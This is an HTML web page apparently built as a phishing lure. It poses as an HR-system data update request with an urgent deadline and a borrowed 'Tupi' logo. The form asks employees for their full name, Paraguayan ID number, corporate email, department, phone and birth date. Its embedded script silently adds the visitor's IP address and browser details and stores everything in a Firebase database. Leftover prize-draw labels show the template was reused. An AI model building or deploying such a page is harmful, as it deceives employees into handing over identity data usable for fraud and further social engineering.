<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualización datos</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        :root {
            --azul-oscuro: #041972;
            --azul-medio: #013ba6;
            --azul-claro: #5386d9;
            --rojo: #cf152d;
            --amarillo: #fdc526;
            --amarillo-claro: #fcdb00;
        }
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f8f9fa;
        }
        .header {
            background: #F89A20;
            color: white;
            padding: 20px 0;
            text-align: center;
        }
        .hotel-img {
            border-radius: 10px;
            margin-bottom: 20px;
            transition: transform 0.3s;
            border: 3px solid var(--azul-claro);
        }
        .hotel-img:hover {
            transform: scale(1.03);
            box-shadow: 0 0 15px var(--amarillo);
        }
        .form-container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
            border-top: 5px solid var(--rojo);
        }
        .btn-primary {
            background-color: var(--azul-medio);
            border: none;
            padding: 10px 25px;
            font-weight: bold;
        }
        .btn-primary:hover {
            background-color: var(--azul-oscuro);
            transform: translateY(-2px);
        }
        .logo {
            max-width: 200px;
            margin: 20px auto;
            display: block;
        }
        h1, h2, h3 {
            color: white;
        }
        .highlight {
            color: var(--rojo);
            font-weight: bold;
        }
        footer {
            background-color: #F89A20;
            color: white;
        }
        .form-label {
            font-weight: 600;
            color: var(--azul-medio);
        }
        .header p.lead {
            color: var(--amarillo-claro);
        }
		.border-image {
			margin-top: 20px; /* Espacio entre el botón y la imagen */
			opacity: 0.8; /* Ajusta la transparencia si es necesario */
			transition: opacity 0.3s;
}

.border-image:hover {
    opacity: 1; /* Efecto hover sutil */
}
    </style>
	
</head>
<body>
    <!-- Header con título -->
    <div class="header mb-5">
        <div class="container">
            <h2>Actualización de datos</h2>
			<img src="https://i.ibb.co/6RbQtkgW/Tupi.png " alt="Logo" class="logo img-fluid">
        </div>
    </div>
	
<div class="container my-4">
    <div class="row justify-content-center">
        <div class="col-lg-8">
            <div class="beneficios-sorteo p-4 rounded-3" style="background-color: #fff8e6; border: 2px solid var(--amarillo);">
                <h4 class="text-center mb-3 fw-bold" style="color: var(--azul-oscuro);">Requerimiento para actualición de datos para sistema de RRHH</h4>
                
                <!-- Beneficios principales (2 columnas) -->
                <div class="row">
                    <div class="col-md-6">
                        <ul class="list-unstyled">
                            <li class="mb-3 d-flex align-items-start">
                                <span class="me-2 fs-5" style="color: var(--rojo);">✓</span>
                                <div>
                                    <strong>Se debe completar el formulario</strong>
                                </div>
                            </li>
                           
                        </ul>
                    </div>
                    <div class="col-md-6">
                        <ul class="list-unstyled">
                            <li class="mb-3 d-flex align-items-start">
                                <span class="me-2 fs-5" style="color: var(--rojo);">✓</span>
                                <div>
                                    <strong>Fecha limite para completar es el lunes 10/11/2025</strong>
                                </div>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


    <!-- Formulario de participación -->
    <div class="container my-5">
        <div class="row justify-content-center">
            <div class="col-lg-8">
                <div class="form-container">
                    <h3 class="text-center mb-4"></h3>
                    <form id="sorteoForm">
                        <div class="mb-3">
                            <label for="nombre" class="form-label">Nombre y Apellido Completo</label>
                            <input type="text" class="form-control" id="nombre" required>
                        </div>
                        <div class="mb-3">
                            <label for="cedula" class="form-label">Número de Cédula de Identidad Paraguaya</label>
                            <input type="text" class="form-control" id="cedula" required>
                        </div>
                        <div class="mb-3">
                            <label for="email" class="form-label">Correo Electrónico Corporativo</label>
                            <input type="email" class="form-control" id="email" required>
                        </div>
						<div class="mb-3">
                            <label for="departamento" class="form-label">Area o departamento</label>
                            <input type="text" class="form-control" id="departamento" required>
                        </div>
                        <div class="mb-3">
                            <label for="telefono" class="form-label">Número de Teléfono</label>
                            <input type="tel" class="form-control" id="telefono" required>
                        </div>
                        <div class="mb-3">
                            <label for="fechaNacimiento" class="form-label">Fecha de Nacimiento</label>
                            <input type="date" class="form-control" id="fechaNacimiento" required>
                        </div>
                        <div class="text-center">
                            <button type="submit" class="btn btn-primary mb-3">Enviar datos</button>

						<div class=" mt-3 mb-0 p-2 small">
						<strong>Fecha limite:</strong> 10/11/2025.

                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="text-white text-center py-4 mt-5">
        <div class="container">
            <p></p>
        </div>
    </footer>
	
	<!-- Firebase y Script de envío -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js';

        // Configuración de Firebase (usa tus propios datos)
        const firebaseConfig = {
			apiKey: "AIzaSyAy6BR7vdo2PwOrQjRX6agMT5_RfTOqdxg",
			authDomain: "tupi-db614.firebaseapp.com",
			projectId: "tupi-db614",
			storageBucket: "tupi-db614.firebasestorage.app",
			messagingSenderId: "196312119739",
			appId: "1:196312119739:web:06428947fea486f6956c9e",
			measurementId: "G-D45WGFNWVN"
        };

        // Inicializar Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Sanitizar inputs (seguridad básica)
        function sanitizeInput(input) {
            return input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }

        // Obtener IP del usuario
        async function getUserIP() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error obteniendo la IP:", error);
                return "Desconocida";
            }
        }

        // Manejar envío del formulario
        document.getElementById('sorteoForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            // Obtener datos del formulario
            const nombre = sanitizeInput(document.getElementById('nombre').value.trim());
            const cedula = sanitizeInput(document.getElementById('cedula').value.trim());
            const email = sanitizeInput(document.getElementById('email').value.trim());
			const departamento = sanitizeInput(document.getElementById('departamento').value.trim());
            const telefono = sanitizeInput(document.getElementById('telefono').value.trim());
            const fechaNacimiento = document.getElementById('fechaNacimiento').value;

            // Validar campos vacíos
            if (!nombre || !cedula || !email || !telefono || !fechaNacimiento) {
                alert('Por favor, completa todos los campos.');
                return;
            }

            // Obtener metadatos
            const ip = await getUserIP();
            const dispositivo = navigator.userAgent;
            const fechaParticipacion = new Date().toLocaleString('es-PY');

            try {
                // Guardar en Firestore
                await addDoc(collection(db, "actualizacion"), {
                    nombre,
                    cedula,
                    email,
                    telefono,
                    fechaNacimiento,
					departamento,
                    ip,
                    dispositivo,
                    fechaParticipacion,
                    timestamp: new Date() // Para ordenar por fecha
                });

                // Mostrar modal de confirmación
                const modal = new bootstrap.Modal(document.getElementById('confirmacionModal'));
                modal.show();

                // Opcional: Resetear formulario después de 2 segundos
                setTimeout(() => {
                    e.target.reset();
                }, 2000);

            } catch (error) {
                console.error("Error al enviar datos:", error);
                alert("Ocurrió un error al registrar tu participación. Por favor, intenta nuevamente.");
            }
        });
    </script>
	
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.getElementById('sorteoForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('¡Gracias por participar! Tu formulario ha sido enviado.');
        });
    </script>
</body>
</html>